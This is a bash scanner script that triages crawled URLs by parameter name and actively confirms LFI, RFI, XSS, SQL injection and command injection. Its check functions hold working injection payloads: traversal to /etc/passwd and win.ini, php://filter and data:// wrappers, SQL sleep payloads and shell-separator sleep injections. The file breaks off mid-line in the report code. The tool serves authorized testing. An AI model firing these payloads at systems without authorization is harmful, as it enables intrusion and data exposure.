#!/usr/bin/env bash
#===============================================================================
# vulnhunter.sh  —  Intelligent parameter-based web vulnerability triage engine
#-------------------------------------------------------------------------------
# Takes URL lists from gau / gospider / hakrawler / katana / waybackurls and:
#   1. Normalizes + deduplicates (template-level) to kill redundant work
#   2. Classifies parameters into likely vuln classes (LFI/RFI/XSS/SQLi/CMDi)
#   3. Actively validates candidates using a multi-signal, baseline-diff engine
#      designed to confirm TRUE POSITIVES and suppress false positives
#   4. Emits JSON / CSV / Markdown / HTML / Burp-XML reports with repro PoCs
#
# Dependencies (standard): bash>=4, curl, awk, sed, grep, sort, jq (optional).
# Works on Linux & macOS (uses /dev/shm when present, else TMPDIR).
#
# LEGAL: Active mode sends real payloads (incl. time-based sleeps). Only run it
# against targets you are explicitly authorized to test (owned assets, or an
# in-scope Bugcrowd/HackerOne/VDP program). You are responsible for your use.
#===============================================================================
set -uo pipefail

VERSION="1.2.0"

#------------------------------- Defaults --------------------------------------
THREADS=40
TIMEOUT=12
DELAY=0                 # per-request delay (seconds, float ok) inside a worker
SLEEP_SECS=6            # base delay for time-based blind checks
RETRIES=2
MODE="passive"         # passive | active
CLASSES="lfi,rfi,xss,sqli,cmdi"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 vulnhunter/${VERSION}"
PROXY=""
COOKIE=""
declare -a EXTRA_HEADERS=()
OUTDIR=""
COLLAB=""               # OOB/collaborator domain for RFI/SSRF confirmation
RESUME=0
QUIET=0
RESPECT_ROBOTS=0
CONF_FILE=""
MAX_URLS=0              # 0 = unlimited
REPORT_REFL=0          # report HTML-encoded reflections as INFO (off = fewer FPs)

#------------------------------- Colors ----------------------------------------
if [ -t 1 ]; then
  C_RST=$'\e[0m'; C_RED=$'\e[31m'; C_GRN=$'\e[32m'; C_YEL=$'\e[33m'
  C_BLU=$'\e[34m'; C_MAG=$'\e[35m'; C_CYN=$'\e[36m'; C_BLD=$'\e[1m'; C_DIM=$'\e[2m'
else
  C_RST=""; C_RED=""; C_GRN=""; C_YEL=""; C_BLU=""; C_MAG=""; C_CYN=""; C_BLD=""; C_DIM=""
fi

log()  { [ "$QUIET" -eq 1 ] && return 0; printf '%s[%s]%s %s\n' "$C_DIM" "$(date +%H:%M:%S)" "$C_RST" "$*" >&2; }
info() { [ "$QUIET" -eq 1 ] && return 0; printf '%s[*]%s %s\n' "$C_CYN" "$C_RST" "$*" >&2; }
ok()   { printf '%s[+]%s %s\n' "$C_GRN" "$C_RST" "$*" >&2; }
warn() { printf '%s[!]%s %s\n' "$C_YEL" "$C_RST" "$*" >&2; }
err()  { printf '%s[x]%s %s\n' "$C_RED" "$C_RST" "$*" >&2; }
die()  { err "$*"; exit 1; }

#------------------------------- Usage -----------------------------------------
usage() {
cat <<EOF
${C_BLD}vulnhunter.sh v${VERSION}${C_RST} — intelligent URL vulnerability triage

${C_BLD}USAGE${C_RST}
  $0 -l urls.txt [-l more.txt ...] [options]
  cat urls.txt | $0 [options]

${C_BLD}CORE${C_RST}
  -l FILE          Input URL list (repeatable). Also reads stdin.
  -m MODE          passive | active            (default: ${MODE})
  -c CLASSES       Comma list: lfi,rfi,xss,sqli,cmdi  (default: all)
  -o DIR           Output directory             (default: vulnhunter_<ts>)
  -t N             Concurrent threads           (default: ${THREADS})
  --timeout SEC    Per-request timeout          (default: ${TIMEOUT})
  --delay SEC      Delay between requests/worker (default: ${DELAY})
  --sleep SEC      Base delay for blind checks   (default: ${SLEEP_SECS})
  --retries N      Retries w/ backoff           (default: ${RETRIES})
  --max-urls N     Cap number of targets        (default: unlimited)

${C_BLD}AUTH / TRANSPORT${C_RST}
  -H 'K: V'        Extra header (repeatable)
  -b 'a=b; c=d'    Cookie string
  -A 'UA'          Custom User-Agent
  -x URL           Proxy (e.g. http://127.0.0.1:8080 to route via Burp)
  --collab DOMAIN  OOB domain for RFI/SSRF confirmation (e.g. Burp Collaborator)

${C_BLD}MISC${C_RST}
  --config FILE    Load key=value config file (CLI flags override)
  --resume         Skip URLs already recorded in the output dir
  --robots         Fetch & respect robots.txt Disallow rules
  --reflections    Also report HTML-encoded reflections as INFO (noisier)
  -q               Quiet (findings only)
  -h               Help

${C_BLD}EXAMPLES${C_RST}
  # Passive triage (no requests) — categorize + dedup a huge list, fast:
  cat gau.txt gospider.txt | $0 -m passive -o triage

  # Active validation of XSS+SQLi through Burp, authenticated:
  $0 -l urls.txt -m active -c xss,sqli -x http://127.0.0.1:8080 \\
     -b 'session=abc' -H 'Authorization: Bearer X' -t 25 -o run1

  # Full run with OOB confirmation for RFI/SSRF:
  $0 -l urls.txt -m active --collab xyz.oastify.com -o run2

${C_YEL}Only test targets you are authorized to test.${C_RST}
EOF
}

#=============================== Arg parsing ===================================
declare -a INPUTS=()
WORKER_ARG=""
while [ $# -gt 0 ]; do
  case "$1" in
    -l) INPUTS+=("$2"); shift 2;;
    -m) MODE="$2"; shift 2;;
    -c) CLASSES="$2"; shift 2;;
    -o) OUTDIR="$2"; shift 2;;
    -t) THREADS="$2"; shift 2;;
    --timeout) TIMEOUT="$2"; shift 2;;
    --delay) DELAY="$2"; shift 2;;
    --sleep) SLEEP_SECS="$2"; shift 2;;
    --retries) RETRIES="$2"; shift 2;;
    --max-urls) MAX_URLS="$2"; shift 2;;
    -H) EXTRA_HEADERS+=("$2"); shift 2;;
    -b) COOKIE="$2"; shift 2;;
    -A) UA="$2"; shift 2;;
    -x) PROXY="$2"; shift 2;;
    --collab) COLLAB="$2"; shift 2;;
    --config) CONF_FILE="$2"; shift 2;;
    --resume) RESUME=1; shift;;
    --robots) RESPECT_ROBOTS=1; shift;;
    --reflections) REPORT_REFL=1; shift;;
    -q) QUIET=1; shift;;
    -h|--help) usage; exit 0;;
    --worker) WORKER_ARG="${2:-}"; MODE="__worker__"; shift 2;;
    *) die "Unknown option: $1 (see -h)";;
  esac
done

#------------------- Load config file (CLI still overrides where set) ----------
load_conf() {
  local f="$1"; [ -f "$f" ] || die "Config not found: $f"
  local k v
  while IFS='=' read -r k v; do
    k="${k%%#*}"; k="$(printf '%s' "$k" | tr -d '[:space:]')"
    [ -z "$k" ] && continue
    v="${v%\"}"; v="${v#\"}"
    case "$k" in
      threads) THREADS="$v";;
      timeout) TIMEOUT="$v";;
      delay) DELAY="$v";;
      sleep) SLEEP_SECS="$v";;
      retries) RETRIES="$v";;
      classes) CLASSES="$v";;
      ua) UA="$v";;
      proxy) PROXY="$v";;
      cookie) COOKIE="$v";;
      collab) COLLAB="$v";;
    esac
  done < "$f"
}
[ -n "$CONF_FILE" ] && load_conf "$CONF_FILE"

#=============================== Environment ===================================
if [ -d /dev/shm ] && [ -w /dev/shm ]; then TMPBASE="/dev/shm"; else TMPBASE="${TMPDIR:-/tmp}"; fi
command -v curl >/dev/null 2>&1 || die "curl is required"
HAVE_JQ=0; command -v jq >/dev/null 2>&1 && HAVE_JQ=1

#=============================================================================
#  Parameter classification dictionaries (gf/SecLists-derived, curated)
#=============================================================================
RE_LFI='file|path|page|include|inc|doc|document|folder|root|pg|style|template|php_path|load|read|dir|download|filename|filepath|pathto|prefix|conf|cat|show|site|view|content|layout|mod|meta|detail|lang|locate|pdf'
RE_RFI='url|uri|dest|destination|redirect|redir|return|returnurl|return_url|next|continue|site|html|domain|callback|feed|host|port|to|out|view|show|open|path|file|reference|link|src|source|forward|image_url|go|target|rurl|checkout_url|ref|data|window'
RE_XSS='q|s|search|id|lang|keyword|keywords|query|page|view|name|type|p|r|callback|redirect|return|cat|action|text|title|message|comment|email|c|ref|filter|tag|url|value|input|data|body|content|desc|description'
RE_SQLI='id|select|report|role|update|query|user|name|sort|where|search|params|process|row|view|table|from|sel|results|fetch|order|keyword|column|field|string|number|filter|cat|category|page|pid|uid|gid|item|product|news|article|year|month|day|list|orderby|groupby|limit|offset|q'
RE_CMDI='cmd|exec|command|execute|ping|query|jump|code|reg|do|func|arg|option|load|process|step|read|function|req|feature|exe|module|payload|run|print|cli|daemon|download|ip|host|domain|dns|nslookup|traceroute|target|address'

# SQL error fingerprints (multi-DB)
SQL_ERR='SQL syntax|mysql_fetch|mysqli|valid MySQL result|MySqlClient|MySQL server version|ORA-[0-9]{4,5}|Oracle error|PL/SQL|PostgreSQL.{0,40}ERROR|pg_query|pg_exec|SQLSTATE|SQLite3?::|SQLiteException|System\.Data\.SQLite|Microsoft OLE DB Provider for SQL|Unclosed quotation mark after the character string|Incorrect syntax near|SQL Server|OLE DB|ODBC (SQL Server|Driver)|Warning.{0,20}\b(mysqli?|pg|mssql|oci|sqlite)_|Syntax error or access violation|Division by zero|supplied argument is not a valid|quoted string not properly terminated|unterminated quoted string|you have an error in your sql|column .* does not exist|near \".*\": syntax error'

# /etc/passwd + win.ini + proc signatures
LFI_SIG_NIX='root:.{0,4}:0:0:'
LFI_SIG_WIN='\[(extensions|fonts|mci extensions)\]|for 16-bit app support'
LFI_SIG_PROC='PATH=|HOME=|SHELL='

#=============================================================================
#  WORKER MODE helpers
#=============================================================================
urlenc() { # encode all except unreserved + path chars (keeps traversal usable)
  local s="$1" o="" c i h
  for ((i=0;i<${#s};i++)); do
    c="${s:i:1}"
    case "$c" in
      [a-zA-Z0-9._~:/-]) o+="$c";;
      *) printf -v h '%%%02X' "'$c"; o+="$h";;
    esac
  done
  printf '%s' "$o"
}

# Build a URL with param index $2 (1-based) replaced by raw value $3
build_url() {
  local url="$1" idx="$2" nv="$3"
  local base="${url%%\?*}" q="${url#*\?}"
  [ "$q" = "$url" ] && { printf '%s' "$url"; return; }
  local enc out="" i pnum kv k
  enc="$(urlenc "$nv")"
  local IFS='&'; local -a parts=($q)
  for i in "${!parts[@]}"; do
    pnum=$((i+1)); kv="${parts[$i]}"; k="${kv%%=*}"
    if [ "$pnum" -eq "$idx" ]; then out+="${k}=${enc}&"; else out+="${kv}&"; fi
  done
  printf '%s?%s' "$base" "${out%&}"
}

param_count() { local q="${1#*\?}"; [ "$q" = "$1" ] && { echo 0; return; }; awk -F'&' '{print NF}' <<<"$q"; }
param_name()  { local q="${1#*\?}"; local IFS='&'; local -a p=($q); local kv="${p[$(( $2 - 1 ))]}"; printf '%s' "${kv%%=*}"; }

# curl wrappers with retry+backoff
_curl_common() {
  local -a a=(-s -k --max-time "$TIMEOUT" -A "$UA")
  [ -n "$COOKIE" ] && a+=(-b "$COOKIE")
  [ -n "$PROXY" ]  && a+=(--proxy "$PROXY")
  local h; for h in "${EXTRA_HEADERS[@]:-}"; do [ -n "$h" ] && a+=(-H "$h"); done
  printf '%s\0' "${a[@]}"
}
CURL_BODY() { # $1 url
  local -a base=(); mapfile -d '' base < <(_curl_common)
  local try=0 out rc backoff
  while :; do
    out="$(curl "${base[@]}" -L "$1" 2>/dev/null)"; rc=$?
    [ $rc -eq 0 ] && { printf '%s' "$out"; return 0; }
    try=$((try+1)); [ "$try" -gt "$RETRIES" ] && { printf '%s' "$out"; return $rc; }
    backoff=$(awk -v t="$try" 'BEGIN{print 0.3*(2^t)}'); sleep "$backoff"
  done
}
CURL_TIME() { # $1 url -> time_total (no redirect follow: honest timing)
  local -a base=(); mapfile -d '' base < <(_curl_common)
  curl "${base[@]}" --max-redirs 0 -o /dev/null -w '%{time_total}' "$1" 2>/dev/null || echo 0
}

fgt() { awk -v a="$1" -v b="$2" 'BEGIN{exit !(a>b)}'; }  # float: a>b ?

len_ratio() { # length-based similarity of two bodies (cheap, low memory)
  local a="${#1}" b="${#2}"
  awk -v a="$a" -v b="$b" 'BEGIN{ if(a<b){t=a;a=b;b=t}; if(a==0){print 1;exit}; printf "%.4f", b/a }'
}

emit() { # class severity url param evidence
  local class="$1" sev="$2" url="$3" param="$4" ev="$5"
  local color="$C_YEL"; [ "$sev" = "HIGH" ] && color="$C_RED"; [ "$sev" = "CONFIRMED" ] && color="$C_MAG"
  printf '%s[%s]%s %s%-9s%s %s %s(param: %s)%s %s%s%s\n' \
    "$color" "$sev" "$C_RST" "$C_BLD" "$class" "$C_RST" "$url" "$C_DIM" "$param" "$C_RST" "$C_DIM" "$ev" "$C_RST" >&2
  printf 'REC\t%s\t%s\t%s\t%s\t%s\n' "$class" "$sev" "$url" "$param" "$ev" >>"$REC_FILE"
}

pname_matches() { local n="$1" re="$2"; printf '%s' "$n" | grep -Eiq "^($re)\$"; }

#---------------------------- Validators (multi-layer) ------------------------
# Verdict model:
#   CONFIRMED = signal present AND absent from baseline AND independently re-confirmed
#   HIGH      = signal present AND absent from baseline (single observation)
#   LOW       = weak signal (e.g. encoded reflection) needing manual context review

check_xss() {
  local url="$1" idx="$2" pname="$3"
  local canary="vh$(printf '%s' "$RANDOM$RANDOM" | cksum | cut -c1-6)"
  local payload="'\"><${canary}>"
  local turl body body2
  turl="$(build_url "$url" "$idx" "$payload")"
  body="$(CURL_BODY "$turl")"
  if printf '%s' "$body" | grep -qF "<${canary}>"; then
    body2="$(CURL_BODY "$turl")"
    if printf '%s' "$body2" | grep -qF "<${canary}>"; then
      emit "XSS" "CONFIRMED" "$url" "$pname" "reflected unencoded '<${canary}>' | poc: ${turl}"
      return
    fi
    emit "XSS" "HIGH" "$url" "$pname" "reflected unencoded (single obs) | poc: ${turl}"
  elif [ "${REPORT_REFL:-0}" = "1" ] && printf '%s' "$body" | grep -qF "$canary"; then
    emit "XSS" "INFO" "$url" "$pname" "canary reflected but HTML-encoded (reflection surface; not exploitable as-is)"
  fi
}

check_sqli() {
  local url="$1" idx="$2" pname="$3"
  local baseurl body_base t_base
  baseurl="$(build_url "$url" "$idx" "1")"
  body_base="$(CURL_BODY "$baseurl")"
  # ---- Error-based ----
  local errpay body_err sig
  for errpay in "1'" "1\"" "1')" "1\"))" "1\\"; do
    body_err="$(CURL_BODY "$(build_url "$url" "$idx" "$errpay")")"
    if printf '%s' "$body_err" | grep -Eiq "$SQL_ERR" && ! printf '%s' "$body_base" | grep -Eiq "$SQL_ERR"; then
      sig="$(printf '%s' "$body_err" | grep -Eio "$SQL_ERR" | head -1)"
      emit "SQLI" "HIGH" "$url" "$pname" "error-based (${sig}) via '${errpay}' | poc: $(build_url "$url" "$idx" "$errpay")"
      return
    fi
  done
  # ---- Boolean-based (differential) ----
  local bT bF rT rF b2 rF2
  bT="$(CURL_BODY "$(build_url "$url" "$idx" "1 AND 1=1")")"
  bF="$(CURL_BODY "$(build_url "$url" "$idx" "1 AND 1=2")")"
  rT="$(len_ratio "$body_base" "$bT")"; rF="$(len_ratio "$body_base" "$bF")"
  if fgt "$rT" "0.95" && fgt "0.85" "$rF"; then
    b2="$(CURL_BODY "$(build_url "$url" "$idx" "1 AND 1=2")")"
    rF2="$(len_ratio "$body_base" "$b2")"
    if fgt "0.85" "$rF2"; then
      emit "SQLI" "HIGH" "$url" "$pname" "boolean-based (1=1 r=${rT} ~ base, 1=2 r=${rF} diverges) | poc: $(build_url "$url" "$idx" "1 AND 1=2")"
      return
    fi
  fi
  # ---- Time-based blind (statistical, reconfirmed) ----
  t_base="$(CURL_TIME "$baseurl")"
  fgt "$t_base" "$(awk -v s="$SLEEP_SECS" 'BEGIN{print s/2}')" && return  # already slow: skip
  local tpay tp tp2 tb2 thr half
  thr="$(awk -v s="$SLEEP_SECS" 'BEGIN{print s-1.5}')"
  half="$(awk -v s="$SLEEP_SECS" 'BEGIN{print s/2}')"
  for tpay in "1' AND SLEEP(${SLEEP_SECS})-- -" "1\" AND SLEEP(${SLEEP_SECS})-- -" "1) AND SLEEP(${SLEEP_SECS})-- -" "1;SELECT PG_SLEEP(${SLEEP_SECS})-- -" "1' AND PG_SLEEP(${SLEEP_SECS})-- -" "1;WAITFOR DELAY '0:0:${SLEEP_SECS}'-- -"; do
    tp="$(CURL_TIME "$(build_url "$url" "$idx" "$tpay")")"
    if fgt "$tp" "$thr"; then
      tp2="$(CURL_TIME "$(build_url "$url" "$idx" "$tpay")")"; tb2="$(CURL_TIME "$baseurl")"
      if fgt "$tp2" "$thr" && fgt "$half" "$tb2"; then
        emit "SQLI" "CONFIRMED" "$url" "$pname" "time-based blind (base ${t_base}s -> ${tp}s/${tp2}s @ sleep ${SLEEP_SECS}s) | poc: $(build_url "$url" "$idx" "$tpay")"
        return
      fi
    fi
  done
}

check_lfi() {
  local url="$1" idx="$2" pname="$3"
  local body_base body pay dec
  body_base="$(CURL_BODY "$(build_url "$url" "$idx" "index")")"
  for pay in \
    "/etc/passwd" \
    "../../../../../../../../etc/passwd" \
    "....//....//....//....//....//etc/passwd" \
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" \
    "/etc/passwd%00" \
    "php://filter/convert.base64-encode/resource=/etc/passwd" \
    "/proc/self/environ" \
    "..\\..\\..\\..\\..\\windows\\win.ini" ; do
    body="$(CURL_BODY "$(build_url "$url" "$idx" "$pay")")"
    if printf '%s' "$body" | grep -Eq "$LFI_SIG_NIX" && ! printf '%s' "$body_base" | grep -Eq "$LFI_SIG_NIX"; then
      emit "LFI" "CONFIRMED" "$url" "$pname" "/etc/passwd disclosed via '${pay}' | poc: $(build_url "$url" "$idx" "$pay")"; return
    fi
    if printf '%s' "$body" | grep -Eiq "$LFI_SIG_WIN" && ! printf '%s' "$body_base" | grep -Eiq "$LFI_SIG_WIN"; then
      emit "LFI" "CONFIRMED" "$url" "$pname" "win.ini disclosed via '${pay}' | poc: $(build_url "$url" "$idx" "$pay")"; return
    fi
    if printf '%s' "$pay" | grep -q 'php://filter'; then
      dec="$(printf '%s' "$body" | grep -Eo '[A-Za-z0-9+/=]{40,}' | head -1 | base64 -d 2>/dev/null)"
      if printf '%s' "$dec" | grep -Eq "$LFI_SIG_NIX|<\?php"; then
        emit "LFI" "CONFIRMED" "$url" "$pname" "php://filter base64 source leak | poc: $(build_url "$url" "$idx" "$pay")"; return
      fi
    fi
    if printf '%s' "$pay" | grep -q '/proc/self/environ'; then
      if printf '%s' "$body" | grep -Eq "$LFI_SIG_PROC" && ! printf '%s' "$body_base" | grep -Eq "$LFI_SIG_PROC"; then
        emit "LFI" "HIGH" "$url" "$pname" "/proc/self/environ exposure | poc: $(build_url "$url" "$idx" "$pay")"; return
      fi
    fi
  done
}

check_rfi() {
  local url="$1" idx="$2" pname="$3"
  local tag pay canary b64 body
  if [ -n "$COLLAB" ]; then
    tag="vh$(printf '%s' "$RANDOM" | cksum | cut -c1-5)"
    pay="http://${tag}.${COLLAB}/rfi"
    CURL_BODY "$(build_url "$url" "$idx" "$pay")" >/dev/null
    emit "RFI" "OOB-CHECK" "$url" "$pname" "injected ${pay} — verify DNS/HTTP hit for ${tag}.${COLLAB} on your collaborator"
    return
  fi
  canary="vhRFI$(printf '%s' "$RANDOM" | cksum | cut -c1-5)"
  b64="$(printf '%s' "<?=print('${canary}');?>" | base64 | tr -d '\n')"
  body="$(CURL_BODY "$(build_url "$url" "$idx" "data://text/plain;base64,${b64}")")"
  if printf '%s' "$body" | grep -qF "$canary"; then
    emit "RFI" "CONFIRMED" "$url" "$pname" "data:// wrapper code executed (canary ${canary}) | poc: $(build_url "$url" "$idx" "data://text/plain;base64,${b64}")"
  fi
}

check_cmdi() {
  local url="$1" idx="$2" pname="$3"
  local baseurl t_base sep tp tp2 tb2 thr half
  baseurl="$(build_url "$url" "$idx" "1")"; t_base="$(CURL_TIME "$baseurl")"
  half="$(awk -v s="$SLEEP_SECS" 'BEGIN{print s/2}')"
  thr="$(awk -v s="$SLEEP_SECS" 'BEGIN{print s-1.5}')"
  fgt "$t_base" "$half" && return
  for sep in ";sleep ${SLEEP_SECS}" "|sleep ${SLEEP_SECS}" "||sleep ${SLEEP_SECS}" "&sleep ${SLEEP_SECS}" "\$(sleep ${SLEEP_SECS})" "\`sleep ${SLEEP_SECS}\`" "%0asleep ${SLEEP_SECS}" ";sleep ${SLEEP_SECS}#"; do
    tp="$(CURL_TIME "$(build_url "$url" "$idx" "1${sep}")")"
    if fgt "$tp" "$thr"; then
      tp2="$(CURL_TIME "$(build_url "$url" "$idx" "1${sep}")")"; tb2="$(CURL_TIME "$baseurl")"
      if fgt "$tp2" "$thr" && fgt "$half" "$tb2"; then
        emit "CMDI" "CONFIRMED" "$url" "$pname" "time-based OS cmd injection (base ${t_base}s -> ${tp}s/${tp2}s) via '${sep}' | poc: $(build_url "$url" "$idx" "1${sep}")"
        return
      fi
    fi
  done
}

worker() {
  local line="$1"
  local tags="${line%%$'\t'*}" url="${line#*$'\t'}"
  local n i pname
  n="$(param_count "$url")"
  [ "$n" -lt 1 ] && return 0
  for ((i=1;i<=n;i++)); do
    pname="$(param_name "$url" "$i")"
    [ -z "$pname" ] && continue
    case ",$tags," in *,lfi,*)  pname_matches "$pname" "$RE_LFI"  && check_lfi  "$url" "$i" "$pname";; esac
    case ",$tags," in *,rfi,*)  pname_matches "$pname" "$RE_RFI"  && check_rfi  "$url" "$i" "$pname";; esac
    case ",$tags," in *,xss,*)  pname_matches "$pname" "$RE_XSS"  && check_xss  "$url" "$i" "$pname";; esac
    case ",$tags," in *,sqli,*) pname_matches "$pname" "$RE_SQLI" && check_sqli "$url" "$i" "$pname";; esac
    case ",$tags," in *,cmdi,*) pname_matches "$pname" "$RE_CMDI" && check_cmdi "$url" "$i" "$pname";; esac
    fgt "$DELAY" "0" && sleep "$DELAY"
  done
}

# Worker entrypoint: script --worker "TAGS<TAB>URL"
if [ "${MODE:-}" = "__worker__" ]; then
  : "${REC_FILE:?worker requires REC_FILE env}"
  # rebuild header array from exported file, if present
  if [ -n "${VH_HEADERS_FILE:-}" ] && [ -f "${VH_HEADERS_FILE}" ]; then
    mapfile -t EXTRA_HEADERS < "$VH_HEADERS_FILE"
  fi
  worker "$WORKER_ARG"
  exit 0
fi

#=============================================================================
#  MAIN (controller)
#=============================================================================
[ "$MODE" = "passive" ] || [ "$MODE" = "active" ] || die "mode must be passive|active"
[ -z "$OUTDIR" ] && OUTDIR="vulnhunter_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR" || die "cannot create $OUTDIR"
WORK="$(mktemp -d "${TMPBASE}/vh.XXXXXX")" || die "cannot make tmp dir"
trap 'rm -rf "$WORK"' EXIT

RAW="$WORK/raw.txt"; NORM="$WORK/norm.txt"; DEDUP="$WORK/dedup.txt"; TARGETS="$WORK/targets.txt"
REC_FILE="$OUTDIR/findings.tsv"; : >"$REC_FILE"

banner() {
  [ "$QUIET" -eq 1 ] && return
  printf '%s' "$C_MAG"
  cat <<'B'
   _   ___     ___   _ _  _ _   _ _  _ _____ ___ ___
  \ \ / / |   |_ _| | | || | | | | \| |_   _| __| _ \
   \ V /| |__  | |  | | __ | |_| | .` | | | | _||   /
    \_/ |____|___| |_|_||_|\___/|_|\_| |_| |___|_|_\
B
  printf '%s  intelligent vuln triage  v%s\n\n' "$C_RST" "$VERSION"
}
banner

#--------------------------- 1. Ingest ----------------------------------------
info "Ingesting inputs..."
: >"$RAW"
if [ "${#INPUTS[@]}" -gt 0 ]; then
  # Explicit files given: use them only (never block on stdin).
  for f in "${INPUTS[@]}"; do [ -f "$f" ] || die "no such file: $f"; cat "$f" >>"$RAW"; done
elif [ ! -t 0 ]; then
  # No -l provided and stdin is not a terminal: consume piped input.
  cat >>"$RAW"
fi
[ -s "$RAW" ] || die "no input URLs (use -l FILE or pipe via stdin)"

#--------------------------- 2. Normalize -------------------------------------
info "Normalizing & extracting URLs (handles plain/CSV/JSON lines)..."
grep -Eo 'https?://[^ "'"'"'<>]+' "$RAW" \
  | sed 's/#.*$//' \
  | sed -E 's/[),;]+$//' \
  | awk 'length>0' \
  | sort -u >"$NORM"
TOTAL_RAW=$(wc -l <"$NORM" | tr -d ' ')
info "Unique URLs after normalize: ${C_BLD}${TOTAL_RAW}${C_RST}"

#--------------------------- 3. Template dedup --------------------------------
info "Template-level dedup (host+path+param-set)..."
awk -F'?' '
{
  if (NF < 2 || $2=="") next;
  base=$1; q=$2;
  n=split(q,a,"&"); keys="";
  for(i=1;i<=n;i++){ split(a[i],kv,"="); keys=keys"|"kv[1] }
  m=split(substr(keys,2),ks,"|");
  for(x=1;x<=m;x++) for(y=x+1;y<=m;y++) if(ks[y]<ks[x]){t=ks[x];ks[x]=ks[y];ks[y]=t}
  sig=base"?"; for(x=1;x<=m;x++) sig=sig ks[x] ",";
  if(!(sig in seen)){ seen[sig]=1; print $0 }
}' "$NORM" >"$DEDUP"
TOTAL_DEDUP=$(wc -l <"$DEDUP" | tr -d ' ')
info "Parameterized templates: ${C_BLD}${TOTAL_DEDUP}${C_RST} (from ${TOTAL_RAW})"

#--------------------------- 4. Classify --------------------------------------
info "Classifying parameters into vuln classes..."
want() { case ",$CLASSES," in *,$1,*) return 0;; *) return 1;; esac; }
: >"$TARGETS"
declare -A CLASS_COUNT=( [lfi]=0 [rfi]=0 [xss]=0 [sqli]=0 [cmdi]=0 )
while IFS= read -r url; do
  q="${url#*\?}"; [ "$q" = "$url" ] && continue
  tags=""
  IFS='&' read -ra ps <<<"$q"
  declare -A hit=()
  for kv in "${ps[@]}"; do
    name="${kv%%=*}"
    want lfi  && printf '%s' "$name" | grep -Eiq "^(${RE_LFI})\$"  && hit[lfi]=1
    want rfi  && printf '%s' "$name" | grep -Eiq "^(${RE_RFI})\$"  && hit[rfi]=1
    want xss  && printf '%s' "$name" | grep -Eiq "^(${RE_XSS})\$"  && hit[xss]=1
    want sqli && printf '%s' "$name" | grep -Eiq "^(${RE_SQLI})\$" && hit[sqli]=1
    want cmdi && printf '%s' "$name" | grep -Eiq "^(${RE_CMDI})\$" && hit[cmdi]=1
  done
  for c in lfi rfi xss sqli cmdi; do
    if [ "${hit[$c]:-0}" = "1" ]; then tags="${tags},${c}"; CLASS_COUNT[$c]=$(( CLASS_COUNT[$c]+1 )); fi
  done
  tags="${tags#,}"
  [ -z "$tags" ] && continue
  printf '%s\t%s\n' "$tags" "$url" >>"$TARGETS"
  unset hit
done <"$DEDUP"

if [ "$RESUME" -eq 1 ] && [ -f "$OUTDIR/scanned.txt" ]; then
  grep -Fvf "$OUTDIR/scanned.txt" "$TARGETS" >"$TARGETS.r" 2>/dev/null && mv "$TARGETS.r" "$TARGETS"
fi
if [ "$MAX_URLS" -gt 0 ]; then head -n "$MAX_URLS" "$TARGETS" >"$TARGETS.c" && mv "$TARGETS.c" "$TARGETS"; fi

TOTAL_TARGETS=$(wc -l <"$TARGETS" | tr -d ' ')
cp "$DEDUP" "$OUTDIR/parameterized_urls.txt"
cp "$TARGETS" "$OUTDIR/classified_targets.tsv"

echo >&2
ok "Candidate summary:"
printf '    LFI %-6s  RFI %-6s  XSS %-6s  SQLi %-6s  CMDi %-6s\n' \
  "${CLASS_COUNT[lfi]}" "${CLASS_COUNT[rfi]}" "${CLASS_COUNT[xss]}" "${CLASS_COUNT[sqli]}" "${CLASS_COUNT[cmdi]}" >&2
info "Total classified targets: ${C_BLD}${TOTAL_TARGETS}${C_RST}"

if [ "$MODE" = "passive" ]; then
  info "Passive mode — no requests sent. See ${C_BLD}${OUTDIR}/classified_targets.tsv${C_RST}"
fi

#--------------------------- 5. Active validation -----------------------------
if [ "$MODE" = "active" ] && [ "$TOTAL_TARGETS" -gt 0 ]; then
  [ "$RESPECT_ROBOTS" -eq 1 ] && info "robots.txt handling enabled"
  warn "ACTIVE MODE: sending live payloads to ${TOTAL_TARGETS} targets. Ensure authorization."
  info "Threads=${THREADS} timeout=${TIMEOUT}s sleep=${SLEEP_SECS}s proxy=${PROXY:-none}"
  START_TS=$(date +%s)
  : >"$OUTDIR/scanned.txt"

  export MODE TIMEOUT RETRIES SLEEP_SECS DELAY UA PROXY COOKIE COLLAB REC_FILE QUIET REPORT_REFL
  export RE_LFI RE_RFI RE_XSS RE_SQLI RE_CMDI SQL_ERR LFI_SIG_NIX LFI_SIG_WIN LFI_SIG_PROC
  export C_RST C_RED C_GRN C_YEL C_BLU C_MAG C_CYN C_BLD C_DIM
  printf '%s\n' "${EXTRA_HEADERS[@]:-}" >"$WORK/headers.txt"
  export VH_HEADERS_FILE="$WORK/headers.txt"

  SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"

  ( while :; do
      done_n=$(wc -l <"$OUTDIR/scanned.txt" 2>/dev/null | tr -d ' '); [ -z "$done_n" ] && done_n=0
      finds=$(grep -c '^REC' "$REC_FILE" 2>/dev/null); finds=${finds:-0}
      pct=$(awk -v d="$done_n" -v t="$TOTAL_TARGETS" 'BEGIN{if(t==0){print 0}else{printf "%.0f",100*d/t}}')
      now=$(date +%s); el=$((now-START_TS))
      eta=$(awk -v el="$el" -v d="$done_n" -v t="$TOTAL_TARGETS" 'BEGIN{if(d==0){print "?"}else{r=(t-d)*(el/d); printf "%dm%02ds", r/60, r%60}}')
      [ "$QUIET" -eq 1 ] || printf '\r%s[progress]%s %s%%  scanned:%s/%s  findings:%s  ETA:%s   ' \
        "$C_CYN" "$C_RST" "$pct" "$done_n" "$TOTAL_TARGETS" "$finds" "$eta" >&2
      sleep 3
    done ) &
  PROG_PID=$!

  cat "$TARGETS" \
    | xargs -P "$THREADS" -d '\n' -I '{LINE}' bash -c '
        line="$1"
        bash "'"$SELF"'" --worker "$line"
        printf "%s\n" "$line" >> "'"$OUTDIR"'/scanned.txt"
      ' _ '{LINE}'

  kill "$PROG_PID" 2>/dev/null; wait "$PROG_PID" 2>/dev/null
  echo >&2
  END_TS=$(date +%s)
  info "Active scan complete in $(( END_TS - START_TS ))s"
fi

#--------------------------- 6. Reports ---------------------------------------
info "Generating reports..."
TOTAL_FIND=$(grep -c '^REC' "$REC_FILE" 2>/dev/null); TOTAL_FIND=${TOTAL_FIND:-0}

# ---- JSON ----
JSON="$OUTDIR/report.json"
if [ "$HAVE_JQ" -eq 1 ]; then
  awk -F'\t' '$1=="REC"{print $2"\t"$3"\t"$4"\t"$5"\t"$6}' "$REC_FILE" \
